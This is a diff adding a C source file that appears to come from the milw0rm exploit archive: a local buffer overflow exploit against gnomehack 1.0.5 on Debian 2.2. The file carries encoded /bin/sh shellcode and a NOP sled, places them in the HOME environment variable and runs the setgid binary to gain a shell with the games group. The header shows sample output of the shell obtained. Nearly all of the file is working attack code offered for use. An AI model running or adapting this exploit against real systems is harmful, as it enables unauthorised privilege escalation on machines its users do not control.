@@ -1,0 +1,55 @@
+/* (linux/debian)gnomehack[v1.0.5] buffer overflow, by: v9[v9@fakehalo.org].
+   this will give you an egid=60(games) shell if gnomehack is sgid(=2755) games
+   on debian/2.2, which has gnomehack. (this can also be applied to nethack)
+
+   syntax: ./deb_gnomehack [offset] [alignment].
+
+   example:
+   -------------------------------------------------
+   # ./deb_gnomehack 500 0
+   [ (linux/debian)gnomehack[v1.0.5] buffer overflow, by: v9[v9@fakehalo.org]. ]
+   [ return address: 0xbffff978, offset: 500, align: 0. ]
+   sh-2.03$ id
+   uid=1001(v9) gid=1001(v9) egid=60(games) groups=1001(v9)
+   sh-2.03$
+   -------------------------------------------------
+
+   note: overflow exists in $NETHACKOPTIONS as well, like nethack.
+*/
+#define PATH "/usr/lib/games/gnomehack/gnomehack"       // path to gnomehack.
+#define DEFAULT_OFFSET 500                              // default offset.
+#define DEFAULT_ALIGN 0                                 // default alignment.
+static char exec[]=
+ "\xeb\x24\x5e\x8d\x1e\x89\x5e\x0b\x33\xd2\x89\x56\x07\x89\x56\x0f\xb8\x1b\x56"
+ "\x34\x12\x35\x10\x56\x34\x12\x8d\x4e\x0b\x8b\xd1\xcd\x80\x33\xc0\x40\xcd\x80"
+ "\xe8\xd7\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x01";
+long esp(void){__asm__("movl %esp,%eax");}
+int main(int argc,char **argv){
+ char bof[300];
+ int i,offset,align;
+ long ret;
+ printf("[ (linux/debian)gnomehack[v1.0.5] buffer overflow, by: v9[v9@fakehalo."
+ "org]. ]\n");
+ if(argc>1){offset=atoi(argv[1]);}
+ else{offset=DEFAULT_OFFSET;}
+ if(argc>2){
+  if(atoi(argv[2])>3||atoi(argv[2])<0){
+   printf("*** ignored argument alignment value: %s. (use 0-3)\n",argv[2]);
+   align=DEFAULT_ALIGN;
+  }
+  else{align=atoi(argv[2]);}
+ }
+ else{align=DEFAULT_ALIGN;}
+ ret=(esp()-offset);
+ printf("[ return address: 0x%lx, offset: %d, align: %d. ]\n",ret,offset,align);
+ for(i=align;i<300;i+=4){*(long *)&bof[i]=ret;}
+ for(i=0;i<(250-strlen(exec));i++){*(bof+i)=0x90;}
+ memcpy(bof+i,exec,strlen(exec));
+ setenv("HOME",bof,1);
+ if(execlp(PATH,"gnomehack",0)){
+  printf("*** execution of %s failed. (check the path)\n",PATH);
+  exit(-1);
+ }
+}
+
+// milw0rm.com [2000-11-15]
